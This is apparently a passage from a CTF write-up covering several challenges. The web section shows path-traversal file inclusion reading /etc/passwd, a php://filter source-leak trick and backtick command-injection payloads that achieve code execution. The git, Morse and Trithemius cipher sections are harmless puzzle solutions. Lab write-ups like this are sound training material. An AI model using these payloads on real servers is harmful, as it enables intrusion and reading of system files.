root:x :0:0:root:/root:/bin/bash daemon:x :1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x :2:2:bin:/bin:/usr/sbin/nologin sys:x :3:3:sys:/dev:/usr/sbin/nologin sync:x :4:65534:sync:/bin:/bin/sync games:x :5:60:games:/usr/games:/usr/sbin/nologin man:x :6:12:man:/var/cache/man:/usr/sbin/nologin lp:x :7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x :8:8:mail:/var/mail:/usr/sbin/nologin news:x :9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x :10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x :13:13:proxy:/bin:/usr/sbin/nologin www-data:x :33:33:www-data:/var/www:/usr/sbin/nologin backup:x :34:34:backup:/var/backups:/usr/sbin/nologin list:x :38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x :39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x :41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x :65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x :100:65534::/nonexistent:/usr/sbin/nologin
```

When we enter a path to a file that errors, we are revealed the path of the currently running script. E.g, `/fun1.php?file=../../../../../etc/fooooo` gives:

> Warning: include(../../../../../etc/fooooo): failed to open stream: No such file or directory in /var/www/html/fun1.php on line 5
>
> Warning: include(): Failed opening '../../../../../etc/fooooo' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/fun1.php on line 5

So, since we gave LFI already, I tried another trick, which is using the `php://filter` to be able to base64 encode data. Combining this with the babove path, we are able to read the source code of the page:

```
http://34.72.118.158:6284/fun1.php?file=php://filter/convert.base64-encode/resource=/var/www/html/fun1.php`
```

Which gives:

```bash
PD9waHAKJGZpbGUgPSAkX0dFVFsiZmlsZSJdOwppZihpc3NldCgkZmlsZSkpCnsKICAgICAgICBpbmNsdWRlKCRmaWxlKTsKfQplbHNlCnsKICAgICAgICBpbmNsdWRlKCJzdWdlIik7Cn0KPz4KCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+Cmh0bWwsIGJvZHl7d2lkdGg6IDEwMCU7IGhlaWdodDogMTAwJTsgcGFkZGluZzogMDsgbWFyZ2luOiAwfQpkaXZ7cG9zaXRpb246IGFic29sdXRlOyBwYWRkaW5nOiAwZW07IGJvcmRlcjogMXB4IHNvbGlkICMwMDB9CiNud3t0b3A6IDEwJTsgbGVmdDogMDsgcmlnaHQ6IDUwJTsgYm90dG9tOiA1MCV9CiNuZXt0b3A6IDA7IGxlZnQ6IDUwJTsgcmlnaHQ6IDA7IGJvdHRvbTogNTAlfQojc3d7dG9wOiA1MCU7IGxlZnQ6IDA7IHJpZ2h0OiA1MCU7IGJvdHRvbTogMH0KI3Nle3RvcDogNTAlOyBsZWZ0OiA1MCU7IHJpZ2h0OiAwOyBib3R0b206IDB9Cjwvc3R5bGU+Cgo8ZGl2IGlkPSJudyI+PGltZyBzcmM9Ii9pbWcvZGFiYWJ5NC5qcGciIHN0eWxlPSJ3aWR0aDoxMDAlO2hlaWdodDoxMDAlOyI+PC9kaXY+CjxkaXYgaWQ9Im5lIj48aW1nIHNyYz0iL2ltZy9kYWJhYnk1LmpwZyIgc3R5bGU9IndpZHRoOjEwMCU7aGVpZ2h0OjEwMCU7Ij48L2Rpdj4KPGRpdiBpZD0ic3ciPjxpbWcgc3JjPSIvaW1nL2RhYmFieTYuanBnIiBzdHlsZT0id2lkdGg6MTAwJTpoZWlnaHQ6MTAwJTsiPjwvZGl2Pgo8ZGl2IGlkPSJzZSI+PGltZyBzcmM9Ii9pbWcvZGFiYWJ5Ny5wbmciIHN0eWxlPSJ3aWR0aDoxMDAlOmhlaWdodDoxMDAlOyI+PC9kaXY+Cg==
```

So now we can decode the source of the website pages, which gives us this:

```php
<?php
$file = $_GET["file"];
if(isset($file))
{
        include($file);
}
else
{
        include("suge");
}
?>

<style type="text/css">
html, body{width: 100%; height: 100%; padding: 0; margin: 0}
div{position: absolute; padding: 0em; border: 1px solid #000}
#nw{top: 10%; left: 0; right: 50%; bottom: 50%}
#ne{top: 0; left: 50%; right: 0; bottom: 50%}
#sw{top: 50%; left: 0; right: 50%; bottom: 0}
#se{top: 50%; left: 50%; right: 0; bottom: 0}
</style>

<div id="nw"><img src="/img/dababy4.jpg" style="width:100%;height:100%;"></div>
<div id="ne"><img src="/img/dababy5.jpg" style="width:100%;height:100%;"></div>
<div id="sw"><img src="/img/dababy6.jpg" style="width:100%:height:100%;"></div>
<div id="se"><img src="/img/dababy7.png" style="width:100%:height:100%;"></div>
```

Likewise, we should be able to read the other page (`fun.php`), so trying `fun.php` gives us the following after base64 decoding:

```php
<?php
session_start();
?>
<html
<div style="background-image: url('/img/dababy2.jpg')"
height= 100%;
background-size: cover;
<head>
  <title>DaBaby Cool Name Convertable</title>
</head>
<body>
    <p><form action="fun.php" method="get">
    <b>Enter a cool name:  </b>
    <p></p>
    <input type="text" name="string" value="Your name!">
    <input type="submit">
    <p></p>
    <b>Dababy's Response:  </b>
    </form>
    <?php
    session_start();
    $name = $_GET['string'];
    $_SESSION['count'] = !isset($_SESSION['count']) ? 0 : $_SESSION['count'];
    if (strlen($name) >= 40){
	echo "Dababy says that's a long name";
    }
    else
    {
    if (strpos($name, 'ls') == false && (strpos($name, ';') !== false || strpos($name, '&') !== false || strpos($name, '|') !== false)) {

	 $_SESSION['count']++;
         if ($_SESSION['count'] == 1){
	 echo "Dababy say's no peaking";
	 }
	 if ($_SESSION['count'] == 2){
	 echo "Dababy said no peaking";
	 }
         if ($_SESSION['count'] >= 3){
		 echo '<img src="/img/dababy3.jpg" class="rating" title="Spook" alt="Spook" />';
	 }
    }
    else
    {
	if (strpos($name, 'secr3t') !== false){
		echo "Dababy say's no peaking";
	}
	else
	{
	$_SESSION['count'] = 0;
    	echo shell_exec('echo '.$_GET['string'].' | xargs /var/www/html/dababy.sh');
	}
	}
    }
    ?>
    </p>
</body>
</html>
```

Nice. So we can see the filter that is being used on the input text box, as well as the script that the input is being passed to/used by (`dababy.sh`). I took a peak at `dababy.sh` using the above methods, and it is just this:

```
echo ZWNobyAiJDEgSXMgYSBDb29sIE5hbWUgTGVzc3MgR28hIgo= | base64 -d
echo "$1 Is a Cool Name Lesss Go!"
```

So, if we go back to the name judgement page, we can try inputting something like so to get direct RCE: 

```bash
`base64 dababy.sh``
```

As that will expand to:

```bash
echo "`base64 dababy.sh` Is a Cool Name Lesss Go!"
```

and will pass the above limitations on our name string. As proof:

* `http://34.72.118.158:6284/fun.php?string=%60base64+dababy.sh%60` (that payload) gives:

  ```bash
  ZWNobyAiJDEgSXMgYSBDb29sIE5hbWUgTGVzc3MgR28hIgo= Is a Cool Name Lesss Go!
  ```

Now we just need to find the flag/message. Starting with where we currently are:

```bash
`pwd`
# gives "/var/www/html Is a Cool Name Lesss Go!"
```

Looking for the flag in there, was not successful. Trying one directory up:

```bash
`ls ../`
# gives "flag.txt Is a Cool Name Lesss Go!"
```

There it is. Just cat it:

```bash
`cat ../flag.txt`
# gives "RS{J3TS0N_M4D3_4N0TH3R_0N3} Is a Cool Name Lesss Go!"
```

Flag is `RS{J3TS0N_M4D3_4N0TH3R_0N3}`.

> **n.b.**: As an alternative, if you are a guess god, you may have just found the flag on the LFI by using the `http://34.72.118.158:6284/fun1.php?file=../../../../../var/www/flag.txt` payload.

## Misc
### Revision
> ... They aren’t necessarily obvious but are helpful to know.
>
> http://git.ritsec.club:7000/Revision.git/
>
> ~knif3

So, clone the given repo:

```bash
git clone http://git.ritsec.club:7000/Revision.git/ && cd Revision
```

At this point, given the name of the challenge, I started by sifting through all the commits/revisions, using the following:

```
git log --all --oneline
```

After a bit of scrolling, we come across the following set of revisions:

```
...
| * 76568fd Update sponsorship packet
| * 88aaf37 TXkgZGVzaWduIGlzIGNvbXBsZXRlIQo=
| * 68733d8 N2Q5ZDI1ZjcxY2I4YTVhYmE4NjIwMjU0MGEyMGQ0MDUK
| * b1a0dcb ZjRkNWQwYzA2NzFiZTIwMmJjMjQxODA3YzI0M2U4MGIK
| * 4a2893a NjliNjQ2MjNmODZkZWYxNmNlMTdkNDU0YjhiZTQxYWUK
| * 4963627 ODk3MzE2OTI5MTc2NDY0ZWJjOWFkMDg1ZjMxZTcyODQK
| * 0f40e6e MmNkNmVlMmM3MGIwYmRlNTNmYmU2Y2FjM2M4YjhiYjEK
| * 8e8ce11 OTI1MjBhNWE5Y2Y4OTMyMjBiOWNkNDQ3ZjU4NWYxNDQK
| * 60f4e46 YjcyNjlmYTI1MDg1NDhlNDAzMmM0NTU4MThmMWUzMjEK
| * ee3d68b MzcyZTI1ZjIzYjVhOGFlMzNjN2JhMjAzNDEyYWNlMzAK
| * ebd4f62 ZjUzMDIzODY0NjRmOTUzZWQ1ODFlZGFjMDM1NTZlNTUK
| * 53e3f77 OTI1MjBhNWE5Y2Y4OTMyMjBiOWNkNDQ3ZjU4NWYxNDQK
| * 1849148 NmQ3ZmNlOWZlZTQ3MTE5NGFhOGI1YjZlNDcyNjdmMDMK
| * 9d6d714 ZjRkNWQwYzA2NzFiZTIwMmJjMjQxODA3YzI0M2U4MGIK
| * eae1814 ODk3MzE2OTI5MTc2NDY0ZWJjOWFkMDg1ZjMxZTcyODQK
| * a2e1f5b MDFmYmRjNDRlZjgxOWRiNjI3M2JjMzA5NjVhMjM4MTQK
| * 82b7ac8 YjcyNjlmYTI1MDg1NDhlNDAzMmM0NTU4MThmMWUzMjEK
| * 1b07dd8 OTI1MjBhNWE5Y2Y4OTMyMjBiOWNkNDQ3ZjU4NWYxNDQK
| * c410e16 ZTI5MzExZjZmMWJmMWFmOTA3ZjllZjlmNDRiODMyOGIK
| * a4ee01c OWZmYmY0MzEyNmUzM2JlNTJjZDJiZjdlMDFkNjI3ZjkK
| * 2e1c2e0 YjcyNjlmYTI1MDg1NDhlNDAzMmM0NTU4MThmMWUzMjEK
| * 6fcc886 OWQ3YmYwNzUzNzI5MDhmNTVlMmQ5NDVjMzllMGE2MTMK
| * 2a712b0 YjAyNjMyNGM2OTA0YjJhOWNiNGI4OGQ2ZDYxYzgxZDEK
| * 58e54d7 NzJjZmQyNzJhY2UxNzJmYTM1MDI2NDQ1ZmJlZjliMDMK
| * d8ddbff MmNkNmVlMmM3MGIwYmRlNTNmYmU2Y2FjM2M4YjhiYjEK
| * 432c9ee ZjRkNWQwYzA2NzFiZTIwMmJjMjQxODA3YzI0M2U4MGIK
| * f108cdb OTI1MjBhNWE5Y2Y4OTMyMjBiOWNkNDQ3ZjU4NWYxNDQK
| * 9fe2c0e ZTg1ZGRlMzMwYzM0ZWZiMGU1MjZlZTMwODJlNDM1M2IK
| * 50f69d6 ODk3MzE2OTI5MTc2NDY0ZWJjOWFkMDg1ZjMxZTcyODQK
| * 6f621db MDA5NTIwMDUzYjAwMzg2ZDExNzNmMzk4OGM1NWQxOTIK
| * 48297e0 OTI1MjBhNWE5Y2Y4OTMyMjBiOWNkNDQ3ZjU4NWYxNDQK
| * fca179e NmQ3ZmNlOWZlZTQ3MTE5NGFhOGI1YjZlNDcyNjdmMDMK
| * 8aeb075 OWQ3YmYwNzUzNzI5MDhmNTVlMmQ5NDVjMzllMGE2MTMK
| * 3abc63e ODk3MzE2OTI5MTc2NDY0ZWJjOWFkMDg1ZjMxZTcyODQK
| * 5772320 MDFmYmRjNDRlZjgxOWRiNjI3M2JjMzA5NjVhMjM4MTQK
| * 764794b OTI1MjBhNWE5Y2Y4OTMyMjBiOWNkNDQ3ZjU4NWYxNDQK
| * f23c832 MzJmOGUwYmI2OTQ0YTZlZmU4YjEzNTFiNzJiOGZhY2MK
| * 331c43d ZDliZWQzYjdlMTUxZjExYjhmZGFkZjc1ZjFkYjk2ZDkK
| * 2092ddb NjVkYjI3MzA3YWEwY2RmMGIzYzAzMjM0MzFlMDhhMTUK
| * 2a769dd NDg1YmRiYWNlZmUyMjM0NGY2ZTc4Y2E1OGE2NjkyNDIK
...
```

Which all look like base64 encoded strings. The first entry is "My design is complete!", while all the subsequent ones are just random hexadecimal numbers.

Checking out the most recent revisions, the one for "My design is complete!", I decided to check the difference between that commit, and the one right before it, like so:

```bash
git --no-pager diff --stat --color 88aaf373f80263e14713efea263ac99550711322..68733d819366b78225df3525017876319b96b1a5
```

Which gives you the following output:

```
 flag.txt | 1 +
 1 file changed, 1 insertion(+)
```

Hey, that looks interesting! Checking out that commit, we see `}` in the `flag.txt` file.

At this point, it seems that we need to work through the set of commits relating to the random hexadecimal base64 strings, and `cat flag.txt` at each revision, getting one more individual character of the flag at a time.

With a tiny bit of processing, we can grab just the revision commit SHA's out of the above; This gives us a file with the following set of revisions:

```
68733d8
b1a0dcb
4a2893a
4963627
0f40e6e
8e8ce11
60f4e46
ee3d68b
ebd4f62
53e3f77
1849148
9d6d714
eae1814
a2e1f5b
82b7ac8
1b07dd8
c410e16
a4ee01c
2e1c2e0
6fcc886
2a712b0
58e54d7
d8ddbff
432c9ee
f108cdb
9fe2c0e
50f69d6
6f621db
48297e0
fca179e
8aeb075
3abc63e
5772320
764794b
f23c832
331c43d
2092ddb
2a769dd
```

Which we can now loop through automatically and display the flag file at that revision, like so:

```bash
for line in $(cat revisions); do git checkout $line --quiet && cat flag.txt; done > flag_reversed
```

Which is this, after removing the newlines:

```bash
cat flag_reversed | tr -d '\n'
}sm0c_tig_3s0ht_detp1rcs_u0y_3p0h_I{SR
```

Which, reversed, is:

```
python -c 'print("}sm0c_tig_3s0ht_detp1rcs_u0y_3p0h_I{SR"[::-1])'
RS{I_h0p3_y0u_scr1pted_th0s3_git_c0ms}
```

Flag is `RS{I_h0p3_y0u_scr1pted_th0s3_git_c0ms}`.

## Stego
### InceptionCTF: Dream 4
> Note: This challenge builds off of InceptionCTF: Dream 3
>
> Don’t lose yourself within the dreams, it’s critical to have your totem. Take a close look at the facts of the file presented to you. Please note the flag is marked with an “RITSEC=” rather than {} due to encoding limitations.
>
> Author: Brandon Martin

As this challenge plays off the previous [Inception level 3 challenge](#inception-ctf-dream-3), you should read up on that first, as it got us to this point.

From the file that was used in Inception: Dream 3, we have the following Morse Code text:

```
-.. .-. . .- -- ...
..-. . . .-..
.-. . .- .-..
.-- .... . -.
.-- . .----. .-. .
.. -.
- .... . -- .-.-.-
.. - .----. ...
--- -. .-.. -.--
.-- .... . -.
.-- .
.-- .- -.- .
..- .--.
- .... .- -
.-- .
.-. . .- .-.. .. --.. .
... --- -- . - .... .. -. --.
.-- .- ...
.- -.-. - ..- .- .-.. .-.. -.--
... - .-. .- -. --. . .-.-.-
.-. .. - ... . -.-. -...- -.. .. ...- . .-. ... .. --- -.
```

[Plugging this into cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Morse_Code('Space','Line%20feed')&input=LS4uIC4tLiAuIC4tIC0tIC4uLgouLi0uIC4gLiAuLS4uCi4tLiAuIC4tIC4tLi4KLi0tIC4uLi4gLiAtLgouLS0gLiAuLS0tLS4gLi0uIC4KLi4gLS4KLSAuLi4uIC4gLS0gLi0uLS4tCi4uIC0gLi0tLS0uIC4uLgotLS0gLS4gLi0uLiAtLi0tCi4tLSAuLi4uIC4gLS4KLi0tIC4KLi0tIC4tIC0uLSAuCi4uLSAuLS0uCi0gLi4uLiAuLSAtCi4tLSAuCi4tLiAuIC4tIC4tLi4gLi4gLS0uLiAuCi4uLiAtLS0gLS0gLiAtIC4uLi4gLi4gLS4gLS0uCi4tLSAuLSAuLi4KLi0gLS4tLiAtIC4uLSAuLSAuLS4uIC4tLi4gLS4tLQouLi4gLSAuLS4gLi0gLS4gLS0uIC4gLi0uLS4tCi4tLiAuLiAtIC4uLiAuIC0uLS4gLS4uLi0gLS4uIC4uIC4uLi0gLiAuLS4gLi4uIC4uIC0tLSAtLiA):

```
DREAMS FEEL REAL WHEN WE'RE IN THEM. IT'S ONLY WHEN WE WAKE UP THAT WE REALIZE SOMETHING WAS ACTUALLY STRANGE. RITSEC=DIVERSION
```

Testing it out, `DIVERSION` unlocks the next levels `Limbo.7z`.

After contacting the author, the submission flag format _is not RITSEC=DIVERSION_, rather `RITSEC{...}`.

Flag is `RITSEC{DIVERSION}`.


## Crypto
### Lorem Ipsum
> Flag is case sensitive.

We're given a `ciphertext.txt` file:

```
Incompraehensibilis Conseruator.
Redemptor optimus
Iudex omnipotens
Sapientissimus omnipotens
Redemptor fabricator
Iudex redemptor
Optimus magnus
Aeternus iudex
Auctor omnipotens.
```

As well as a photo of "Virgin Mary, mother of Jesus" which is titled **hint.jpg**.

Disregarding the hint, I tried DuckDuckGo searching for the string "Incompraehensibilis Conseruator.".

The second result was for a geocaching site, [Proz # 5: The Art of Concealing](https://www.geocaching.com/geocache/GC3NFBF_cccc-5-the-art-of-concealing).

On this website, we find this gem:

> A variant of steganography is the linguistic steganography where words of a message are replaced by synonyms based on a key-dependent rule. An example for this would be the Ave-Maria chiffre, which was developed by Johannes Trithemius in the Middle Age and where 24 names of God are translated into 24 letters. The picture on the right shows an improved variant where each letter is represented by two names of God. For example the following phrase:
>
> Omnipotens Pacificus Dominus Consolator Deus Sempiternus Imperator Maximus Fabricator Deus Gubernator Optimus Pastor Sapientissimus Conseruator Conseruator Sapientissimus Aeternus Fortissimus Illustrator Magnus
>
> stands for the _text steganography is simple_

So, we know we seem to be working with an Ave-Maria cipher. They also provide an image of how to decode the ciphertext to plaintext on that site:

{{< image src="https://s3.amazonaws.com/gs-geo-images/acaf9a80-ca23-4bd5-a4f5-94759d5a9eb7.jpg" alt="ave-maria-cipher.jpg" >}}

&nbsp;

So, we can manually decipher the plaintext, looking like so:

```
Incompraehensibilis Conseruator.
(R)                 (S)

Redemptor optimus
(T)       (h)

Iudex omnipotens
(I)   (s)

Sapientissimus omnipotens
(I)            (s)

Redemptor fabricator
(T)       (r)

Iudex redemptor
(I)   (t)

Optimus magnus
(H)     (e)

Aeternus iudex
(M)      (i)

Auctor omnipotens.
(U)    (s)
```

I assumed the captialized ciphertext meant capitalized plaintext, and likewise for lowercase. Submitting it succeeds.

Flag is `RS{ThIsIsTrItHeMiUs}`.

> * **n.b.**: If you tried to use the [online tool to decipher this from dcode](https://www.dcode.fr/trithemius-ave-maria), you would have noticed that the flag was not accepted as that tool doesn't handle casing. Granted, neither does the ciphertext translation image above, so kind of a lame gimmick imo.

